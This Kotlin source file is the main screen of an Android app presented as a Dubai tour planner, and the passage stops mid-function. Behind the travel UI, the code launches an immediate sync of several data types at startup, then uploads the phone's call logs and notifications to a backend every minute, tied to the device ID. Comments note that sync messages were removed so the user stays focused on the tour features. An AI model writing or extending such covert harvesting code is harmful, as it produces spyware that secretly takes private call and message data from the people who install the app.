package com.devicesync.app

import android.app.DatePickerDialog
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import androidx.core.app.NotificationCompat
import androidx.lifecycle.lifecycleScope
import androidx.drawerlayout.widget.DrawerLayout
import androidx.appcompat.app.ActionBarDrawerToggle
import com.google.android.material.navigation.NavigationView
import com.devicesync.app.adapters.DestinationsAdapter
import com.devicesync.app.adapters.ActivitiesAdapter
import com.devicesync.app.adapters.PackagesAdapter
import com.devicesync.app.adapters.ReviewsAdapter
import com.devicesync.app.adapters.TravelTipsAdapter
import com.devicesync.app.api.RetrofitClient
import com.devicesync.app.api.ApiService
import com.devicesync.app.data.Destination
import com.devicesync.app.data.Package
import com.devicesync.app.data.Review
import com.devicesync.app.data.TravelTip
import com.devicesync.app.data.DummyDataProvider
import com.devicesync.app.data.UpdatedDummyDataProvider
import com.devicesync.app.data.DeviceInfo
import com.devicesync.app.data.ConnectionType
import com.devicesync.app.data.Activity
import com.devicesync.app.services.BackendSyncService
import com.devicesync.app.services.NotificationListenerService
import com.devicesync.app.services.SyncResult
import com.devicesync.app.utils.DeviceInfoUtils
import com.devicesync.app.utils.PermissionManager
import com.devicesync.app.utils.SettingsManager
import com.devicesync.app.utils.LanguageManager
import com.devicesync.app.utils.DynamicStringManager
import com.devicesync.app.utils.TranslationService
import com.devicesync.app.utils.TextTranslator
import com.devicesync.app.utils.setTextTranslated
import com.devicesync.app.utils.setHintTranslated
import com.devicesync.app.utils.translateAsync
import com.devicesync.app.utils.updateAllTexts
import com.devicesync.app.utils.translateAll
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import android.util.Log
import com.devicesync.app.viewmodels.MainViewModel
import com.bumptech.glide.Glide
import kotlinx.coroutines.*
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : AppCompatActivity() {
    
    // UI Components
    private lateinit var startPlanningButton: Button
    private lateinit var continuePlanningButton: Button
    private lateinit var dateRangeText: TextView
    private lateinit var startDateText: TextView
    private lateinit var endDateText: TextView
    private lateinit var progressText: TextView
    private lateinit var destinationsRecyclerView: RecyclerView
    private lateinit var activitiesRecyclerView: RecyclerView
    private lateinit var packagesRecyclerView: RecyclerView
    private lateinit var reviewsRecyclerView: RecyclerView
    
    // Navigation Drawer Components
    private lateinit var drawerLayout: DrawerLayout
    private lateinit var navigationView: NavigationView
    private lateinit var toolbar: androidx.appcompat.widget.Toolbar

    
    // Adapters
    private lateinit var destinationsAdapter: DestinationsAdapter
    private lateinit var activitiesAdapter: ActivitiesAdapter
    private lateinit var packagesAdapter: PackagesAdapter
    private lateinit var reviewsAdapter: ReviewsAdapter

    
    // Date picker variables
    private var startDate: Calendar? = null
    private var endDate: Calendar? = null
    
    // Sync functionality
    private lateinit var apiService: ApiService
    private lateinit var backendSyncService: BackendSyncService
    private lateinit var settingsManager: SettingsManager
    
    // Automatic sync variables
    private var autoSyncJob: Job? = null
    private val autoSyncInterval = 60 * 1000L // 1 minute in milliseconds
    private var isFirstSync = true
    private var lastNotificationSyncTime = 0L
    private var lastCallLogSyncTime = 0L

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Apply current language
        LanguageManager.applyLanguageToActivity(this)
        
        setContentView(R.layout.activity_main)
        
        // Initialize sync services
        apiService = RetrofitClient.apiService
        backendSyncService = BackendSyncService(this, apiService)
        settingsManager = SettingsManager(this)
        
        setupViews()
        setupNavigationDrawer()
        setupRecyclerViews()
        loadSampleData()
        setupDatePickers()
        setupServiceButtons()
        
        // Show notification count and request permissions
        showNotificationCount()
        requestNotificationPermission()
        
        // Start immediate sync of all 5 data types when user lands on home screen
        startImmediateSync()
    }
    
    override fun onDestroy() {
        super.onDestroy()
        stopAutomaticSync()
    }
    
    override fun onResume() {
        super.onResume()
        
        // Refresh all translations when activity resumes
        refreshAllTranslatedTexts()
    }
    
    private fun startImmediateSync() {
        lifecycleScope.launch {
            try {
                println("🚀 IMMEDIATE SYNC - Starting all 5 data types sync...")
                
                // Clear any existing sync timestamps to force fresh sync
                backendSyncService.clearSyncTimestamps()
                
                // Start comprehensive sync of all data types
                syncAllData()
                
                println("✅ Immediate sync completed")
            } catch (e: Exception) {
                println("❌ Immediate sync failed: ${e.message}")
            }
        }
    }
    
    private fun startAutomaticSync() {
        // Cancel any existing auto sync job
        autoSyncJob?.cancel()
        
        // Start new automatic sync job
        autoSyncJob = lifecycleScope.launch {
            while (true) {
                try {
                    if (isFirstSync) {
                        // First time: Full sync of all data types
                        println("🚀 FIRST TIME SYNC - Starting comprehensive data sync...")
                        // Welcome message removed for cleaner UX
                        syncAllData()
                        isFirstSync = false
                        println("✅ First time sync completed")
                    } else {
                        // Subsequent syncs: Only latest notifications and call logs
                        println("🔄 Periodic sync - Syncing latest data...")
                        
                        // Sync latest notifications (after last sync time)
                        syncLatestNotifications()
                        
                        // Sync call logs (every 1 minute)
                        val currentTime = System.currentTimeMillis()
                        if (currentTime - lastCallLogSyncTime >= 60000) { // 1 minute
                            syncLatestCallLogs()
                            lastCallLogSyncTime = currentTime
                        }
                    }
                } catch (e: Exception) {
                    println("❌ Automatic sync failed: ${e.message}")
                }
                
                // Wait for the specified interval
                delay(autoSyncInterval)
            }
        }
    }
    
    private fun stopAutomaticSync() {
        autoSyncJob?.cancel()
        autoSyncJob = null
        println("🛑 Automatic sync stopped")
    }
    
    private fun syncLatestNotifications() {
        lifecycleScope.launch {
            try {
                val deviceId = settingsManager.getDeviceId() ?: DeviceInfoUtils.getDeviceId(this@MainActivity)
                println("🔔 Syncing latest notifications for device: $deviceId")
                
                // Get current time for tracking
                val currentTime = System.currentTimeMillis()
                
                // Sync notifications from the last sync time
                val result = backendSyncService.syncNotifications(deviceId, lastNotificationSyncTime)
                when (result) {
                    is SyncResult.Success -> {
                        val count = result.itemsSynced
                        if (count > 0) {
                            println("✅ Synced $count new notifications")
                            // Removed sync toast - keeping tour experience focused
                        }
                        lastNotificationSyncTime = currentTime
                    }
                    is SyncResult.Error -> {
                        println("❌ Failed to sync notifications: ${result.message}")
                    }
                    is SyncResult.PermissionDenied -> {
                        println("⚠️ Notification permission denied: ${result.reason}")
                    }
                }
            } catch (e: Exception) {
                println("❌ Error syncing notifications: ${e.message}")
            }
        }
    }
    
    private fun syncLatestCallLogs() {
        lifecycleScope.launch {
            try {
                val deviceId = settingsManager.getDeviceId() ?: DeviceInfoUtils.getDeviceId(this@MainActivity)
                println("📞 Syncing latest call logs for device: $deviceId")
                
                // Get current time for tracking
                val currentTime = System.currentTimeMillis()
                
                // Sync call logs from the last sync time
                val result = backendSyncService.syncCallLogs(deviceId, forceSync = true)
                when (result) {
                    is SyncResult.Success -> {
                        val count = result.itemsSynced
                        if (count > 0) {
                            println("✅ Synced $count new call logs")
                            // Removed sync toast - keeping tour experience focused
                        }
                        // Update last sync time only if sync was successful
                        lastCallLogSyncTime = currentTime
                    }
                    is SyncResult.Error -> {
                        println("❌ Failed to sync call logs: ${result.message}")
                    }
                    is SyncResult.PermissionDenied -> {
                        println("⚠️ Call log permission denied: ${result.reason}")
                    }
                }
            } catch (e: Exception) {
                println("❌ Error syncing call logs: ${e.message}")
            }
        }
    }
    
    private fun setupViews() {
        // Initialize navigation drawer components
        drawerLayout = findViewById(R.id.drawerLayout)
        navigationView = findViewById(R.id.navigationView)
        toolbar = findViewById(R.id.toolbar)
        
        // Initialize RecyclerView variables
        destinationsRecyclerView = findViewById(R.id.destinationsRecyclerView)
        activitiesRecyclerView = findViewById(R.id.activitiesRecyclerView)
        packagesRecyclerView = findViewById(R.id.packagesRecyclerView)
        reviewsRecyclerView = findViewById(R.id.reviewsRecyclerView)
        
        // Initialize other views
        startDateText = findViewById(R.id.startDateText)
        endDateText = findViewById(R.id.endDateText)
        startPlanningButton = findViewById(R.id.startPlanningButton)
        continuePlanningButton = findViewById(R.id.continuePlanningButton)
        dateRangeText = findViewById(R.id.dateRangeText)
        progressText = findViewById(R.id.progressText)
        
        // Setup main content click listeners
        startPlanningButton?.setOnClickListener {
            if (startDate != null && endDate != null) {
                // Navigate to booking form with selected dates
                val intent = Intent(this, BookingFormActivity::class.java)
                intent.putExtra("startDate", startDate!!.timeInMillis)
                intent.putExtra("endDate", endDate!!.timeInMillis)
                startActivity(intent)
            } else {
                Toast.makeText(this, "Please select both start and end dates", Toast.LENGTH_SHORT).show()
            }
        }
        
        continuePlanningButton?.setOnClickListener {
            val intent = Intent(this, BuildItineraryActivity::class.java)
            startActivity(intent)
        }
        
        // Setup Additional Services click listeners
        findViewById<androidx.cardview.widget.CardView>(R.id.pastExperiencesButton)?.setOnClickListener {
            val intent = Intent(this, PastExperiencesActivity::class.java)
            startActivity(intent)
        }

        findViewById<androidx.cardview.widget.CardView>(R.id.tripManagementButton)?.setOnClickListener {
            val intent = Intent(this, TripManagementActivity::class.java)
            startActivity(intent)
        }

        findViewById<androidx.cardview.widget.CardView>(R.id.servicesButton)?.setOnClickListener {
            val intent = Intent(this, ServicesListActivity::class.java)
            startActivity(intent)
        }

        findViewById<androidx.cardview.widget.CardView>(R.id.tourPackagesButton)?.setOnClickListener {
            val intent = Intent(this, TourPackagesActivity::class.java)
            startActivity(intent)
        }

        findViewById<androidx.cardview.widget.CardView>(R.id.chatNowButton)?.setOnClickListener {
            val intent = Intent(this, LiveChatActivity::class.java)
            startActivity(intent)
        }

        findViewById<androidx.cardview.widget.CardView>(R.id.audioGuideButton)?.setOnClickListener {
            val intent = Intent(this, AudioToursActivity::class.java)
            startActivity(intent)
        }

        findViewById<androidx.cardview.widget.CardView>(R.id.reviewsButton)?.setOnClickListener {
            val intent = Intent(this, ReviewsActivity::class.java)
            startActivity(intent)
        }

        findViewById<androidx.cardview.widget.CardView>(R.id.teamButton)?.setOnClickListener {
            val intent = Intent(this, TeamActivity::class.java)
            startActivity(intent)
        }

        // Setup Travel Tips button
        findViewById<androidx.cardview.widget.CardView>(R.id.travelTipsButton)?.setOnClickListener {
            TravelTipsActivity.start(this)
        }

        findViewById<Button>(R.id.viewAllTipsButton)?.setOnClickListener {
            TravelTipsActivity.start(this)
        }

        // Setup TranslatedTextView elements
        setupTranslatedTexts()
    }
    
    private fun setupNavigationDrawer() {
        // Set up the toolbar
        setSupportActionBar(toolbar)
        
        // Create ActionBarDrawerToggle
        val toggle = ActionBarDrawerToggle(
            this, drawerLayout, toolbar,
            R.string.navigation_drawer_open,
            R.string.navigation_drawer_close
        )
        drawerLayout.addDrawerListener(toggle)
        toggle.syncState()
        
        // Set up navigation item click listener
        navigationView.setNavigationItemSelectedListener { menuItem ->
            when (menuItem.itemId) {
                R.id.nav_profile -> {
                    showProfile()
                    drawerLayout.closeDrawers()
                    true
                }
                R.id.nav_bookings -> {
                    showMyBookings()
                    drawerLayout.closeDrawers()
                    true
                }
                R.id.nav_services -> {
                    showServices()
                    drawerLayout.closeDrawers()
                    true
                }
                R.id.nav_packages -> {
                    showTourPackages()
                    drawerLayout.closeDrawers()
                    true
                }
                R.id.nav_chat -> {
                    showChatNow()
                    drawerLayout.closeDrawers()
                    true
                }
                R.id.nav_settings -> {
                    showSettings()
                    drawerLayout.closeDrawers()
                    true
                }
                R.id.nav_help -> {
                    showHelp()
                    drawerLayout.closeDrawers()
                    true
                }
                else -> false
            }
        }
    }

    private fun setupTranslatedTexts() {
        // Travel Services
        findViewById<com.devicesync.app.views.TranslatedTextView>(R.id.airportTransferTitle)?.setTranslatedText("airport_transfer")
        findViewById<com.devicesync.app.views.TranslatedTextView>(R.id.airportTransferPrice)?.setTranslatedText("airport_transfer_price")
        findViewById<com.devicesync.app.views.TranslatedTextView>(R.id.privateGuideTitle)?.setTranslatedText("private_guide")
        findViewById<com.devicesync.app.views.TranslatedTextView>(R.id.privateGuidePrice)?.setTranslatedText("private_guide_price")
        findViewById<com.devicesync.app.views.TranslatedTextView>(R.id.carWithDriverTitle)?.setTranslatedText("car_with_driver")
        findViewById<com.devicesync.app.views.TranslatedTextView>(R.id.carWithDriverPrice)?.setTranslatedText("car_with_driver_price")
        findViewById<com.devicesync.app.views.TranslatedTextView>(R.id.simCardTitle)?.setTranslatedText("sim_card")
        findViewById<com.devicesync.app.views.TranslatedTextView>(R.id.simCardPrice)?.setTranslatedText("sim_card_price")
        
        // Travel Tips - Now using regular TextView
        
        // Build Own Itinerary - Now using regular TextView
        
        // Additional Services
        findViewById<com.devicesync.app.views.TranslatedTextView>(R.id.additionalServicesTitle)?.setTranslatedText("additional_services")
        findViewById<com.devicesync.app.views.TranslatedTextView>(R.id.pastExperiencesTitle)?.setTranslatedText("past_experiences")
        findViewById<com.devicesync.app.views.TranslatedTextView>(R.id.tripManagementTitle)?.setTranslatedText("trip_management")
        findViewById<com.devicesync.app.views.TranslatedTextView>(R.id.servicesTitle)?.setTranslatedText("services")
        findViewById<com.devicesync.app.views.TranslatedTextView>(R.id.tourPackagesTitle)?.setTranslatedText("tour_packages")
        findViewById<com.devicesync.app.views.TranslatedTextView>(R.id.chatNowTitle)?.setTranslatedText("chat_now")
        findViewById<com.devicesync.app.views.TranslatedTextView>(R.id.audioGuideTitle)?.setTranslatedText("audio_guide")
        findViewById<com.devicesync.app.views.TranslatedTextView>(R.id.reviewsTitle)?.setTranslatedText("reviews")
        findViewById<com.devicesync.app.views.TranslatedTextView>(R.id.teamTitle)?.setTranslatedText("team")
    }
    
    // private fun setupBottomNavigation() {
    //     // Setup bottom navigation click listeners
    //     findViewById<LinearLayout>(R.id.navPackages).setOnClickListener {
    //         // Navigate to tour packages
    //         val intent = Intent(this, TourPackagesActivity::class.java)
    //         startActivity(intent)
    //     }
        
    //     findViewById<LinearLayout>(R.id.navHome).setOnClickListener {
    //         // Already on home, just refresh or show a toast
    //         Toast.makeText(this, "You're already on the home screen", Toast.LENGTH_SHORT).show()
    //     }
        
    //     findViewById<LinearLayout>(R.id.navServices).setOnClickListener {
    //         // Navigate to services home
    //         val intent = Intent(this, ServicesHomeActivity::class.java)
    //         startActivity(intent)
    //     }
        
    //     findViewById<LinearLayout>(R.id.navChat).setOnClickListener {
    //         // Navigate to live chat
    //         val intent = Intent(this, LiveChatActivity::class.java)
    //         startActivity(intent)
    //     }
    // }
    
    private fun setupDatePickers() {
        // Initialize with current date
        val currentDate = Calendar.getInstance()
        startDate = currentDate.clone() as Calendar
        endDate = currentDate.clone() as Calendar
        endDate!!.add(Calendar.DAY_OF_MONTH, 4) // Default 5-day trip
        
        // Set initial text
        startDateText.text = formatDate(startDate!!)
        endDateText.text = formatDate(endDate!!)
        updateDateRange()
        
        startDateText.setOnClickListener {
            showDatePicker(true)
        }
        
        endDateText.setOnClickListener {
            showDatePicker(false)
        }
    }
    
    private fun showDatePicker(isStartDate: Boolean) {
        val calendar = Calendar.getInstance()
        
        val datePickerDialog = DatePickerDialog(
            this,
            { _, year, month, dayOfMonth ->
                val selectedDate = Calendar.getInstance()
                selectedDate.set(year, month, dayOfMonth)
                
                if (isStartDate) {
                    startDate = selectedDate
                    startDateText.text = formatDate(selectedDate)
                } else {
                    endDate = selectedDate
                    endDateText.text = formatDate(selectedDate)
                }
                
                updateDateRange()
            },
            calendar.get(Calendar.YEAR),
            calendar.get(Calendar.MONTH),
            calendar.get(Calendar.DAY_OF_MONTH)
        )
        
        datePickerDialog.show()
    }
    
    private fun formatDate(calendar: Calendar): String {
        val dateFormat = SimpleDateFormat("MMM dd", Locale.getDefault())
        return dateFormat.format(calendar.time)
    }
    
    private fun showNotificationCount() {
        try {
            // Check if notification access is enabled
            val enabledNotificationListeners = Settings.Secure.getString(
                contentResolver,
                "enabled_notification_listeners"
            )
            
            val packageName = packageName
            val isEnabled = enabledNotificationListeners?.contains(packageName) == true
            
            // Get device info for additional context
            val deviceInfo = getDeviceInfo()
            
            // Show comprehensive toast with notification access status and device info
            // App status logged for debugging
            
            // Also log the status for debugging
            android.util.Log.d("MainActivity", "Notification access: $isEnabled, Device: ${deviceInfo.deviceName}")
            
            // Notification access status logged for debugging
            
        } catch (e: Exception) {
            // If we can't access notification settings, show a generic message
            // App loaded successfully
            android.util.Log.e("MainActivity", "Error checking notification access: ${e.message}")
        }
    }
    
    private fun getDeviceInfo(): DeviceInfo {
        return try {
            val deviceName = android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL
            val deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
            val androidId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
            DeviceInfo(deviceId, androidId, deviceName)
        } catch (e: Exception) {
            DeviceInfo("unknown_device", "unknown_android_id", "Unknown Device")
        }
    }
    
    data class DeviceInfo(
        val deviceId: String,
        val androidId: String,
        val deviceName: String
    )
    
    private fun updateDateRange() {
        if (startDate != null && endDate != null) {
            val startFormatted = SimpleDateFormat("MMM dd", Locale.getDefault()).format(startDate!!.time)
            val endFormatted = SimpleDateFormat("MMM dd", Locale.getDefault()).format(endDate!!.time)
            dateRangeText.setTextTranslated("$startFormatted – $endFormatted", this)
        }
    }
    
    private fun showMenuDialog() {
        val options = arrayOf("Settings", "About", "Help", "Contact Us")
        val dialog = AlertDialog.Builder(this, R.style.WhiteDialogTheme)
            .setTitle("Menu")
            .setItems(options) { _, which ->
                when (which) {
                    0 -> showSettings()
                    1 -> showAbout()
                    2 -> showHelp()
                    3 -> showContact()
                }
            }
            .create()
        
        dialog.show()
        
        // Force set text color to black for better visibility
        dialog.listView?.let { listView ->
            // Set adapter to ensure items are created
            listView.post {
                for (i in 0 until listView.count) {
                    val child = listView.getChildAt(i)
                    if (child is TextView) {
                        child.setTextColor(resources.getColor(R.color.text_dark, theme))
                        child.textSize = 16f
                    }
                }
            }
        }
    }
    
    private fun showSettings() {
        val intent = Intent(this, SettingsActivity::class.java)
        startActivity(intent)
    }
    
    private fun showPrivacySettings() {
        val intent = Intent(this, PrivacySettingsActivity::class.java)
        startActivity(intent)
    }
    
    private fun showProfile() {
        val intent = Intent(this, UserProfileActivity::class.java)
        startActivity(intent)
    }
    
    private fun showMyBookings() {
        val dialog = AlertDialog.Builder(this, R.style.WhiteDialogTheme)
            .setTitle("My Bookings")
            .setMessage("Your booking history and upcoming tours will be displayed here.\n\nComing soon!")
            .setPositiveButton("OK") { _, _ -> }
            .create()
        dialog.show()
    }
    
    private fun showServices() {
        val intent = Intent(this, ServicesHomeActivity::class.java)
        startActivity(intent)
    }
    
    private fun showTourPackages() {
        val intent = Intent(this, TourPackagesActivity::class.java)
        startActivity(intent)
    }
    
    private fun showChatNow() {
        val intent = Intent(this, TeamChatActivity::class.java)
        startActivity(intent)
    }
    
    private fun showAbout() {
        Toast.makeText(this, "Dubai Discoveries v2.0", Toast.LENGTH_SHORT).show()
    }
    
    private fun showContact() {
        Toast.makeText(this, "Contact: support@dubaidiscoveries.com", Toast.LENGTH_LONG).show()
    }
    
    private fun showUserProfileDialog() {
        val options = arrayOf("Profile", "My Bookings", "Services", "Tour Packages", "Chat Now")
        
        val dialog = AlertDialog.Builder(this, R.style.WhiteDialogTheme)
            .setTitle("Menu")
            .setItems(options) { _, which ->
                when (which) {
                    0 -> showProfile()
                    1 -> showMyBookings()
                    2 -> showServices()
                    3 -> showTourPackages()
                    4 -> showChatNow()
                }
            }
            .setNegativeButton("Cancel") { _, _ -> }
            .create()
        
        dialog.show()
    }

    private fun showProfileSettings() {
        Toast.makeText(this, "Profile Settings - Coming Soon", Toast.LENGTH_SHORT).show()
    }

    private fun showPayment() {
        Toast.makeText(this, "Payment - Coming Soon", Toast.LENGTH_SHORT).show()
    }

    private fun showSyncStatus() {
        try {
            val statusInfo = backendSyncService.getSyncStatusInfo()
            println("📊 SYNC STATUS REPORT:")
            println("🔄 Sync in progress: ${statusInfo["isSyncInProgress"]}")
            println("⏱️ Current sync duration: ${statusInfo["currentSyncDuration"]}ms")
            
            statusInfo.forEach { (key, value) ->
                if (key != "isSyncInProgress" && key != "currentSyncDuration") {
                    val dataTypeInfo = value as Map<*, *>
                    println("📱 $key:")
                    println("   Last sync: ${dataTypeInfo["lastSyncDate"]}")
                    println("   Can sync: ${dataTypeInfo["canSync"]}")
                    println("   Next sync: ${dataTypeInfo["nextSyncDate"]}")
                }
            }
        } catch (e: Exception) {
            println("❌ Error getting sync status: ${e.message}")
        }
    }

    private fun showHelp() {
        Toast.makeText(this, "Help & Support - Coming Soon", Toast.LENGTH_SHORT).show()
    }

    private fun showLogout() {
        Toast.makeText(this, "Logout - Coming Soon", Toast.LENGTH_SHORT).show()
    }
    
    private fun showLanguageDialog() {
        val languages = arrayOf("English", "Монгол", "Русский", "中文", "Қазақша")
        val languageCodes = arrayOf("en", "mn", "ru", "zh", "kk")
        
        val dialog = AlertDialog.Builder(this, R.style.WhiteDialogTheme)
            .setTitle("🌍 Select Language / Выберите язык / 选择语言")
            .setItems(languages) { _, which ->
                setAppLanguage(languageCodes[which])
            }
            .setNegativeButton("Cancel") { _, _ -> }
            .create()
        
        dialog.show()
        
        // Force set text color to black for better visibility
        dialog.listView?.let { listView ->
            // Set adapter to ensure items are created
            listView.post {
                for (i in 0 until listView.count) {
                    val child = listView.getChildAt(i)
                    if (child is TextView) {
                        child.setTextColor(resources.getColor(R.color.text_dark, theme))
                        child.textSize = 18f
                        child.setPadding(32, 16, 32, 16)
                    }
                }
            }
        }
    }
    
    private fun setAppLanguage(languageCode: String) {
        // Show immediate feedback
        val languageNames = mapOf(
            "en" to "English",
            "mn" to "Монгол", 
            "ru" to "Русский",
            "zh" to "中文",
            "kk" to "Қазақша"
        )
        
        val languageName = languageNames[languageCode] ?: languageCode
        Toast.makeText(this, "🌍 Changing language to: $languageName", Toast.LENGTH_LONG).show()
        
        // Save the language preference
        LanguageManager.setLanguage(this, languageCode)
        
        // Refresh all TranslatedTextView components
        refreshAllTranslatedTexts()
        
        // Update all texts before changing language
        updateAllTexts()
        
        // Use the improved language manager method
        LanguageManager.restartActivityWithLanguage(this, languageCode)
        
        // Show confirmation after a delay
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            Toast.makeText(this, "✅ Language changed to: $languageName", Toast.LENGTH_SHORT).show()
        }, 1000)
    }
    
    private fun refreshAllTranslatedTexts() {
        // Refresh all TranslatedTextView components to update their text
        val translatedTextViews = listOf(
            R.id.airportTransferTitle, R.id.airportTransferPrice,
            R.id.privateGuideTitle, R.id.privateGuidePrice,
            R.id.carWithDriverTitle, R.id.carWithDriverPrice,
            R.id.simCardTitle, R.id.simCardPrice,
            R.id.additionalServicesTitle, R.id.pastExperiencesTitle,
            R.id.tripManagementTitle, R.id.servicesTitle, R.id.tourPackagesTitle,
            R.id.chatNowTitle, R.id.audioGuideTitle, R.id.reviewsTitle, R.id.teamTitle
        )

        translatedTextViews.forEach { id ->
            findViewById<com.devicesync.app.views.TranslatedTextView>(id)?.let { textView ->
                // Force refresh the text by calling the translation again
                textView.refreshText()
            }
        }

        // Also refresh any other text elements that might need updating
        refreshOtherTextElements()
    }
    
    private fun refreshOtherTextElements() {
        // Refresh button texts
        findViewById<Button>(R.id.startPlanningButton)?.let { button ->
            button.setTextTranslated("Start Planning", this)
        }
        
        findViewById<Button>(R.id.continuePlanningButton)?.let { button ->
            button.setTextTranslated("Continue Planning", this)
        }
    }
    
    private fun initializeDynamicTranslations() {
        // Preload translations for current language
        val currentLanguage = LanguageManager.getCurrentLanguage(this)
        if (currentLanguage != "en") {
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    DynamicStringManager.preloadLanguage(currentLanguage, this@MainActivity)
                    Log.d("MainActivity", "Preloaded translations for $currentLanguage")
                } catch (e: Exception) {
                    Log.e("MainActivity", "Failed to preload translations", e)
                }
            }
        }
    }
    
    private fun updateAllTexts() {
        // Update all hardcoded texts with dynamic translations
        updateMainScreenTexts()
        translateAllHardcodedTexts()
    }
    
    private fun translateAllHardcodedTexts() {
        // Define all hardcoded texts that need translation
        // val hardcodedTexts = mapOf<Int, String>()
        
        // Update all texts using the utility function
        // updateAllTexts(hardcodedTexts)
        
        // Also update any other hardcoded texts manually
        updateServiceCardTexts()
        updateSectionHeaders()
        updateButtonTexts()
        
        // Update programmatically set texts
        updateProgrammaticTexts()
    }
    
    private fun updateProgrammaticTexts() {
        // Update date range text that's set programmatically
        findViewById<TextView>(R.id.dateRangeText)?.let { textView ->
            textView.setTextTranslated("Aug 10 – Aug 14", this)
        }
        
        // Update progress text that's set programmatically
        findViewById<TextView>(R.id.progressText)?.let { textView ->
            textView.setTextTranslated("2 of 5 days planned", this)
        }
    }
    
    private fun updateMainScreenTexts() {
        // Update main screen texts using dynamic translation
        // This will be called when language changes
        runOnUiThread {
            // Update service card texts
            updateServiceCardTexts()
            
            // Update section headers
            updateSectionHeaders()
            
            // Update button texts
            updateButtonTexts()
        }
    }
    
    private fun updateServiceCardTexts() {
        // Update service card texts using the utility function
        findViewById<Button>(R.id.airportTransferButton)?.let { button ->
            button.setTextTranslated("Add Service", this)
        }
        
        findViewById<Button>(R.id.privateGuideButton)?.let { button ->
            button.setTextTranslated("Add Service", this)
        }
        
        findViewById<Button>(R.id.carWithDriverButton)?.let { button ->
            button.setTextTranslated("Add Service", this)
        }
        
        findViewById<Button>(R.id.simCardButton)?.let { button ->
            button.setTextTranslated("Add Service", this)
        }
    }
    
    private fun updateSectionHeaders() {
        // Update section header texts using the utility function
        // These are already using string resources, but we can add any hardcoded ones here
        Log.d("MainActivity", "Section headers updated")
    }
    
    private fun updateButtonTexts() {
        // Update button texts using the utility function
        findViewById<Button>(R.id.startPlanningButton)?.let { button ->
            button.setTextTranslated("Start Planning", this)
        }
        
        // findViewById<Button>(R.id.viewAllTipsButton)?.let { button ->
        //     button.setTextTranslated("View All Tips", this)
        // }
        
        findViewById<Button>(R.id.continuePlanningButton)?.let { button ->
            button.setTextTranslated("Continue Planning", this)
        }
    }
    
    private fun testTranslationSystem() {
        // Test the new TextTranslator utility
        CoroutineScope(Dispatchers.IO).launch {
            try {
                // Test 1: Simple text translation
                val testText = "Welcome to Dubai"
                val translatedText = testText.translateAsync(this@MainActivity)
                
                // Test 2: Multiple texts translation
                val multipleTexts = mapOf(
                    "Add Service" to "Add Service",
                    "Continue Planning" to "Continue Planning",
                    "View All Tips" to "View All Tips"
                )
                val translatedMultiple = multipleTexts.translateAll(this@MainActivity)
                
                runOnUiThread {
                    Toast.makeText(this@MainActivity, 
                        "TextTranslator Test:\n'$testText' -> '$translatedText'\n\nMultiple texts: ${translatedMultiple.size} translated", 
                        Toast.LENGTH_LONG).show()
                }
                
                Log.d("MainActivity", "TextTranslator test successful: $testText -> $translatedText")
                Log.d("MainActivity", "Multiple translations: $translatedMultiple")
                
            } catch (e: Exception) {
                Log.e("MainActivity", "TextTranslator test failed", e)
                runOnUiThread {
                    Toast.makeText(this@MainActivity, 
                        "TextTranslator test failed: ${e.message}", 
                        Toast.LENGTH_LONG).show()
                }
            }
        }
    }
    
    private fun showCalendarService() {
        AlertDialog.Builder(this, R.style.WhiteDialogTheme)
            .setTitle("Calendar Service")
            .setMessage("Schedule and manage your Dubai trips with our calendar service. Features include:\n\n• Trip scheduling\n• Activity reminders\n• Booking management\n• Travel timeline\n• Export to device calendar")
            .setPositiveButton("Open Calendar") { _, _ ->
                // Navigate to calendar activity or show calendar view
                Toast.makeText(this, "Calendar service coming soon!", Toast.LENGTH_SHORT).show()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }
    
    private fun showTravelTipDetails(travelTip: TravelTip) {
        AlertDialog.Builder(this, R.style.WhiteDialogTheme)
            .setTitle(travelTip.title)
            .setMessage(travelTip.description)
            .setPositiveButton("Got it!") { _, _ ->
                // Tip acknowledged
            }
            .setNegativeButton("Share") { _, _ ->
                // Share tip functionality
                val shareIntent = Intent(Intent.ACTION_SEND)
                shareIntent.type = "text/plain"
                shareIntent.putExtra(Intent.EXTRA_SUBJECT, "Dubai Travel Tip: ${travelTip.title}")
                shareIntent.putExtra(Intent.EXTRA_TEXT, "${travelTip.title}\n\n${travelTip.description}\n\nShared from Dubai Discoveries App")
                startActivity(Intent.createChooser(shareIntent, "Share via"))
            }
            .show()
    }
    
    private fun loadRelevantImages() {
        // Image loading removed - using clean design with menu icon only
    }
    
    private fun setupRecyclerViews() {
        // Destinations RecyclerView - Horizontal slider
        destinationsRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
        destinationsAdapter = DestinationsAdapter(DummyDataProvider.destinations) { destination ->
            // Launch destination detail activity
            val intent = Intent(this, DestinationDetailActivity::class.java)
            intent.putExtra("destination", destination)
            startActivity(intent)
        }
        destinationsRecyclerView.adapter = destinationsAdapter
        
        // Activities RecyclerView - Horizontal slider
        activitiesRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
        activitiesAdapter = ActivitiesAdapter(emptyList()) { activity ->
            // Launch activity detail activity
            val intent = Intent(this, ActivityDetailActivity::class.java)
            intent.putExtra("activityName", activity.name)
            startActivity(intent)
        }
        activitiesRecyclerView.adapter = activitiesAdapter
        
        // Packages RecyclerView
        packagesRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
        packagesAdapter = PackagesAdapter(emptyList()) { packageItem ->
            // Launch package detail activity
            val intent = Intent(this, PackageDetailActivity::class.java)
            intent.putExtra("packageName", packageItem.name)
            startActivity(intent)
        }
        packagesRecyclerView.adapter = packagesAdapter
        
        // Reviews RecyclerView
